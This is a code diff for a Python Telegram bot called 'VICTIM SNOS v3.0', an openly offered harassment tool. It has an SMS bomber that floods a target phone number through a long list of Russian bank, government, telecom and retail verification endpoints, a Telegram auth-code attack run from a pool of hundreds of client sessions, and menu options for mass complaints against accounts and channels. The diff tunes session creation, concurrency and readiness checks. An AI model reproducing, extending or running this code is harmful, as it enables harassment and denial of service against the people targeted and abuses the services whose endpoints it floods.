@@ -28,14 +28,13 @@ API_HASH = "b18441a1ff607e10a989891a5462e627"
 ADMIN_ID = 7736817432
 ALLOWED_USERS = set()
 
-MAX_SESSIONS = 20000
+MAX_SESSIONS = 600
 BOMBER_DELAY = 300
 TG_ATTACK_DELAY = 300
 
 USE_MAILTM = True
 MAILTM_ACCOUNTS_COUNT = 100
 
-# Путь к баннеру
 BANNER_PATH = "banner.png"
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -46,6 +45,7 @@ dp = Dispatcher(storage=MemoryStorage())
 
 active_attacks = {}
 sessions_pool = []
+sessions_ready = False
 
 class AttackState(StatesGroup):
     waiting_phone = State()
@@ -125,7 +125,6 @@ TELEGRAM_AUTH_SITES = [
 
 # ---------- САЙТЫ ДЛЯ БОМБЕРА ----------
 BOMBER_WEBSITES = [
-    # Соцсети
     {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.vk.com/method/auth.restore", "method": "POST", "phone_field": "phone"},
     {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone"},
@@ -136,8 +135,6 @@ BOMBER_WEBSITES = [
     {"url": "https://passport.yandex.ru/auth/reg/portal", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.dzen.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.rambler.ru/auth/sms", "method": "POST", "phone_field": "phone"},
-    
-    # Мессенджеры
     {"url": "https://web.whatsapp.com/api/sendCode", "method": "POST", "phone_field": "phone_number"},
     {"url": "https://viber.com/api/request_activation_code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.viber.com/pa/request_activation_code", "method": "POST", "phone_field": "phone"},
@@ -145,8 +142,6 @@ BOMBER_WEBSITES = [
     {"url": "https://api.line.me/v2/oauth/accessToken", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.icq.net/auth/sendCode", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.agent.mail.ru/auth/send", "method": "POST", "phone_field": "phone"},
-    
-    # Доставка и такси
     {"url": "https://api.yandex.ru/taxi/order", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.delivery-club.ru/api/v2/auth", "method": "POST", "phone_field": "phone"},
     {"url": "https://eda.yandex/api/v1/auth", "method": "POST", "phone_field": "phone"},
@@ -162,8 +157,6 @@ BOMBER_WEBSITES = [
     {"url": "https://api.metro-cc.ru/auth/send", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.globus.ru/auth/sms", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.okey.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
-    
-    # Банки
     {"url": "https://online.sberbank.ru/CSAFront/api/sms/send", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.tinkoff.ru/v1/restore", "method": "POST", "phone_field": "phone"},
@@ -176,8 +169,6 @@ BOMBER_WEBSITES = [
     {"url": "https://api.qiwi.com/oauth/authorize", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.yoomoney.ru/api/register", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.rosbank.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
-    
-    # Маркетплейсы
     {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.wildberries.ru/auth/v2/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.aliexpress.ru/auth/sms", "method": "POST", "phone_field": "phone"},
@@ -190,36 +181,26 @@ BOMBER_WEBSITES = [
     {"url": "https://api.lamoda.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.kazanexpress.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.sima-land.ru/auth/sms", "method": "POST", "phone_field": "phone"},
-    
-    # Аптеки
     {"url": "https://api.apteka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.eapteka.ru/v1/auth", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.zdravcity.ru/auth/sms", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.rigla.ru/auth/send", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.planetazdorovo.ru/auth/code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.gorzdrav.ru/v1/auth", "method": "POST", "phone_field": "phone"},
-    
-    # Телеком
     {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.yota.ru/auth/sms", "method": "POST", "phone_field": "phone"},
-    
-    # Госуслуги
     {"url": "https://api.gosuslugi.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.mos.ru/v1/auth", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.nalog.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
-    
-    # Транспорт
     {"url": "https://api.rzhd.ru/v1/auth/sms", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.drom.ru/auth/sms", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.tutu.ru/auth/sms", "method": "POST", "phone_field": "phone"},
-    
-    # Другое
     {"url": "https://api.booking.com/auth/sms", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.ostrovok.ru/auth/send", "method": "POST", "phone_field": "phone"},
     {"url": "https://api.svyaznoy.ru/auth/sms", "method": "POST", "phone_field": "phone"},
@@ -330,23 +311,68 @@ class MailTM:
         except:
             return False
 
-# ---------- ИНИЦИАЛИЗАЦИЯ СЕССИЙ ----------
+# ---------- ПРОВЕРКА И ДОПОЛНЕНИЕ СЕССИЙ ----------
+def count_existing_sessions() -> int:
+    """Подсчет существующих сессий"""
+    if not os.path.exists("sessions"):
+        return 0
+    
+    count = 0
+    for f in os.listdir("sessions"):
+        if f.startswith("pool_") and f.endswith(".session"):
+            count += 1
+    return count
+
 async def init_sessions():
-    global sessions_pool
-    logger.info(f"Инициализация {MAX_SESSIONS} сессий...")
+    """Инициализация и дополнение сессий до нужного количества"""
+    global sessions_pool, sessions_ready
     
     os.makedirs("sessions", exist_ok=True)
     
-    for i in range(MAX_SESSIONS):
-        session_file = f"sessions/pool_{i}"
-        try:
-            client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
-            await client.connect()
-            sessions_pool.append({"client": client, "in_use": False, "flood_until": 0})
-            if (i + 1) % 1000 == 0:
-                logger.info(f"Инициализировано {i + 1}/{MAX_SESSIONS} сессий")
-        except Exception as e:
-            logger.error(f"Ошибка сессии {i}: {e}")
+    existing_count = count_existing_sessions()
+    logger.info(f"Найдено существующих сессий: {existing_count}")
+    
+    if existing_count < MAX_SESSIONS:
+        need_to_create = MAX_SESSIONS - existing_count
+        logger.info(f"Необходимо создать еще {need_to_create} сессий")
+        
+        # Загружаем существующие сессии
+        for i in range(existing_count):
+            session_file = f"sessions/pool_{i}"
+            try:
+                client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
+                await client.connect()
+                sessions_pool.append({"client": client, "in_use": False, "flood_until": 0})
+            except Exception as e:
+                logger.error(f"Ошибка загрузки сессии {i}: {e}")
+        
+        # Создаем недостающие сессии
+        for i in range(existing_count, MAX_SESSIONS):
+            session_file = f"sessions/pool_{i}"
+            try:
+                client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
+                await client.connect()
+                sessions_pool.append({"client": client, "in_use": False, "flood_until": 0})
+                if (i + 1) % 50 == 0:
+                    logger.info(f"Создано {i + 1}/{MAX_SESSIONS} сессий")
+            except Exception as e:
+                logger.error(f"Ошибка создания сессии {i}: {e}")
+                await asyncio.sleep(2)
+    else:
+        # Загружаем все существующие сессии
+        for i in range(MAX_SESSIONS):
+            session_file = f"sessions/pool_{i}"
+            try:
+                client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
+                await client.connect()
+                sessions_pool.append({"client": client, "in_use": False, "flood_until": 0})
+                if (i + 1) % 100 == 0:
+                    logger.info(f"Загружено {i + 1}/{MAX_SESSIONS} сессий")
+            except Exception as e:
+                logger.error(f"Ошибка загрузки сессии {i}: {e}")
+    
+    logger.info(f"Итого загружено {len(sessions_pool)}/{MAX_SESSIONS} сессий")
+    sessions_ready = True
 
 async def get_available_sessions(count: int) -> list:
     available = []
@@ -401,16 +427,16 @@ async def tg_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
     successful = 0
     failed = 0
     
-    connector = aiohttp.TCPConnector(limit=1000, force_close=True, ssl=False)
+    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
     
     async with aiohttp.ClientSession(connector=connector) as session:
         for rnd in range(1, rounds + 1):
-            available = await get_available_sessions(MAX_SESSIONS)
+            available = await get_available_sessions(len(sessions_pool))
             
             tasks = []
             
             for website in TELEGRAM_AUTH_SITES:
-                for _ in range(5):
+                for _ in range(3):
                     tasks.append(send_tg_auth_request(session, phone, website))
             
             for sess in available:
@@ -460,14 +486,14 @@ async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tupl
     successful = 0
     failed = 0
     
-    connector = aiohttp.TCPConnector(limit=2000, force_close=True, ssl=False)
+    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
     
     async with aiohttp.ClientSession(connector=connector) as session:
         for rnd in range(1, rounds + 1):
             tasks = []
             
             for website in BOMBER_WEBSITES:
-                for _ in range(3):
+                for _ in range(2):
                     tasks.append(send_bomber_request(session, phone, website))
             
             batch = await asyncio.gather(*tasks, return_exceptions=True)
@@ -589,6 +615,7 @@ def get_main_menu():
     builder.button(text="SMS БОМБЕР", callback_data="bomber_attack")
     builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="complaint_account")
     builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="complaint_channel")
+    builder.button(text="СТАТУС СЕССИЙ", callback_data="sessions_status")
     builder.button(text="СТОП", callback_data="stop_attack")
     builder.adjust(1)
     return builder.as_markup()
@@ -598,7 +625,7 @@ def get_main_menu():
 async def cmd_start(message: types.Message):
     caption = (
         "<b>VICTIM SNOS v3.0</b>\n\n"
-        f"Сессий: {MAX_SESSIONS}\n"
+        f"Сессий: {len(sessions_pool)}/{MAX_SESSIONS}\n"
         f"Сайтов TG: {len(TELEGRAM_AUTH_SITES)}\n"
         f"Сайтов бомбера: {len(BOMBER_WEBSITES)}\n"
         f"Задержка: {BOMBER_DELAY} сек\n\n"
@@ -618,7 +645,7 @@ async def cmd_start(message: types.Message):
 async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
     await state.clear()
     
-    caption = "<b>VICTIM SNOS - Главное меню</b>"
+    caption = f"<b>VICTIM SNOS - Главное меню</b>\n\nСессий: {len(sessions_pool)}/{MAX_SESSIONS}"
     
     if os.path.exists(BANNER_PATH):
         await callback.message.delete()
@@ -632,8 +659,25 @@ async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
     
     await callback.answer()
 
+@dp.callback_query(F.data == "sessions_status")
+async def sessions_status(callback: types.CallbackQuery):
+    await callback.message.edit_text(
+        f"<b>СТАТУС СЕССИЙ</b>\n\n"
+        f"Загружено: {len(sessions_pool)}/{MAX_SESSIONS}\n"
+        f"Готовность: {'Да' if sessions_ready else 'Нет'}\n\n"
+        f"Для дополнения сессий перезапустите бота.",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
+        ])
+    )
+    await callback.answer()
+
 @dp.callback_query(F.data == "tg_attack")
 async def tg_attack_start(callback: types.CallbackQuery, state: FSMContext):
+    if not sessions_ready:
+        await callback.answer("Сессии еще не загружены!", show_alert=True)
+        return
+    
     await state.set_state(AttackState.waiting_phone)
     await callback.message.edit_text(
         "<b>СНОС TELEGRAM</b>\n\n"
@@ -647,6 +691,10 @@ async def tg_attack_start(callback: types.CallbackQuery, state: FSMContext):
 
 @dp.callback_query(F.data == "bomber_attack")
 async def bomber_attack_start(callback: types.CallbackQuery, state: FSMContext):
+    if not sessions_ready:
+        await callback.answer("Сессии еще не загружены!", show_alert=True)
+        return
+    
     await state.set_state(BomberState.waiting_phone)
     await callback.message.edit_text(
         f"<b>SMS БОМБЕР</b>\n\n"
@@ -817,12 +865,19 @@ mail_tm = MailTM()
 
 async def main():
     logger.info("VICTIM SNOS v3.0 запуск...")
-    logger.info(f"Сессий: {MAX_SESSIONS}")
-    logger.info(f"Сайтов TG: {len(TELEGRAM_AUTH_SITES)}")
-    logger.info(f"Сайтов бомбера: {len(BOMBER_WEBSITES)}")
     
+    # Сначала запускаем бота
+    await bot.delete_webhook(drop_pending_updates=True)
+    
+    # Запускаем polling в фоне
+    polling_task = asyncio.create_task(dp.start_polling(bot))
+    
+    # Параллельно инициализируем сессии
+    logger.info(f"Проверка и инициализация {MAX_SESSIONS} сессий...")
     await init_sessions()
+    logger.info(f"Сессии готовы: {len(sessions_pool)}/{MAX_SESSIONS}")
     
+    # Инициализация mail.tm
     if USE_MAILTM:
         try:
             with open('mailtm_accounts.json', 'r') as f:
@@ -834,8 +889,10 @@ async def main():
                 json.dump(accounts, f)
             mail_tm.accounts = accounts
     
-    await bot.delete_webhook(drop_pending_updates=True)
-    await dp.start_polling(bot)
+    logger.info("VICTIM SNOS полностью готов к работе!")
+    
+    # Ждем завершения polling
+    await polling_task
 
 if __name__ == "__main__":
     asyncio.run(main())
